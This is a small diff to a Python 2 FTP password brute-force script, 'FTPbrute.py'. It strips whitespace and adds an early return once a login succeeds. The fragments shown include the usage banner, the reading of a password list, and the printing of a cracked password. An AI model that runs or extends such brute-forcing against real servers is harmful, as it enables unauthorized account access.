@@ -10,7 +10,7 @@ def usage():
 	print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
 	print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
 	print " "
-	print " Usage()"	
+	print " Usage()"
 	print "python FTPbrute.py [IP] [user] [password list]"
 	sys.exit()
 
@@ -19,7 +19,7 @@ def main():
 		usage()
 	else:
 		brute()
-	
+
 def brute():
 	user = sys.argv[2]
 	file = open(sys.argv[3])
@@ -35,6 +35,7 @@ def brute():
 		s.send("QUIT\r\n")
 	if re.search("230", result):
 		print "[+] Got the FTP password: %s [+]"%(result)
+		return
 	else:
 		print "[-] You couldn't crack this shit [-]\n"
 	sys.exit()
